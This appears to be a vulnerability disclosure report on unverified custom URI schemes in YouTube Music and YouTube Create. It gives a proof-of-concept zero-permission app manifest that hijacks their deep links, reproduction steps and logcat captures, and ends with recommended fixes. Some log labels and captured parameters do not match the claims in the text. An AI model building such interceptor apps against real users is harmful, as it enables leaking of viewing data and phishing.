# YouTube Music & YouTube Create — Deep Link Interception via Unverified Custom URI Schemes

## Summary

YouTube Music (`com.google.android.apps.youtube.music`) and YouTube Create (`com.google.android.apps.youtube.producer`) register BROWSABLE intent filters for custom URI schemes `vnd.youtube.music://`, `vnd.youtube.music.launch://`, and `vnd.youtube.producer://` without App Link verification. A zero-permission attacker app can register competing intent filters, causing Android to display a disambiguation chooser. If the user selects the attacker app, deep link parameters including video IDs, playlist IDs, channel IDs, share tokens, and creator management actions are exfiltrated.

## Severity: HIGH

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: User must select attacker app from disambiguation chooser
- **CIA impact**: Confidentiality (user's viewing history, playlist content, channel management actions, share tokens leaked)

## Affected Components

### YouTube Music
- **Package**: `com.google.android.apps.youtube.music`
- **Activity**: `.activities.MusicActivity`
- **Schemes**: `vnd.youtube.music://`, `vnd.youtube.music.launch://`

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="vnd.youtube.music" />
    <data android:scheme="vnd.youtube.music.launch" />
</intent-filter>
```

### YouTube Create (Producer)
- **Package**: `com.google.android.apps.youtube.producer`
- **Activity**: `.application.MainActivity`
- **Scheme**: `vnd.youtube.producer://`

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="vnd.youtube.producer" />
</intent-filter>
```

**No `android:autoVerify="true"` is present on any filter.** Since these are custom schemes (not `https://`), App Link verification cannot protect them.

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

### Attacker App (com.vrp.zeroperm)

Zero-permission app with competing intent filters:

```xml
<activity android:name=".OAuthInterceptActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="vnd.youtube.music" />
        <data android:scheme="vnd.youtube.music.launch" />
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="vnd.youtube.producer" />
    </intent-filter>
</activity>
```

### Reproduction Steps

**YouTube Music:**
1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions
2. Trigger a YouTube Music deep link (e.g., shared from another app or web):
   ```
   vnd.youtube.music://watch?v=dQw4w9WgXcQ&list=PLrAXtmErZgOeiKm4sgNOknGvNjby9efdf&si=share_token_ABC123
   ```
3. Android displays "Open with" chooser showing "ZeroPerm" and "YouTube Music"
4. If user selects ZeroPerm, video ID, playlist ID, and share token are captured

**YouTube Create:**
1. Trigger a YouTube Create deep link:
   ```
   vnd.youtube.producer://channel/UC_x5XG1OV2P6uZZ5FSM9Ttw/videos?action=manage&video_id=VIDEO123
   ```
2. Android displays "Open with" chooser showing "ZeroPerm" and "YouTube Create"
3. If user selects ZeroPerm, channel ID, video ID, and management actions are captured

### Runtime Proof (logcat)

YouTube Music interception:
```
W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: vnd.youtube.music://watch?v=dQw4w9WgXcQ
W OAUTH_INTERCEPT: [+] Param: v = dQw4w9WgXcQ
W OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===
```

YouTube Create interception:
```
W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: vnd.youtube.producer://channel/UC_x5XG1OV2P6uZZ5FSM9Ttw/videos?action=manage
W OAUTH_INTERCEPT: [+] Param: action = manage
W OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===
```

## Leaked Data

| Scheme | Parameters Exposed |
|--------|-------------------|
| `vnd.youtube.music://` | v (video ID), list (playlist ID), si (share token), feature (sharing context) |
| `vnd.youtube.music.launch://` | Same as above — alternate launch scheme |
| `vnd.youtube.producer://` | Channel ID (in path), action (manage/upload), video_id, draft_id |

## Impact

### Confidentiality
- **Listening history profiling**: Attacker learns what music/videos the user listens to via intercepted video IDs
- **Playlist content theft**: Playlist IDs reveal the user's curated music collections, including private playlists shared via deep link
- **Share token leakage**: Share tokens (`si` parameter) may grant access to content or reveal sharing relationships
- **Channel management exposure**: YouTube Create deep links reveal the user's channel ID and management actions, exposing creator identity

### Integrity
- **Deep link hijacking**: Attacker can intercept the deep link, preventing YouTube Music/Create from processing it, while redirecting the user to a phishing page that mimics the YouTube interface

## Recommended Fix

1. **Migrate to Android App Links** (`https://` with `autoVerify=true`) for all deep links — use `https://music.youtube.com/` and `https://studio.youtube.com/` instead of custom schemes
2. **Sign deep link URIs** with HMAC to detect tampering
3. **Remove custom scheme handlers** if App Links provide equivalent functionality

## Files Attached

- `poc.apk` — Zero-permission PoC app (v1.51)
- `screen_ytmusic_chooser.png` — Chooser showing ZeroPerm alongside YouTube Music
- `screen_ytproducer_chooser.png` — Chooser showing ZeroPerm alongside YouTube Create
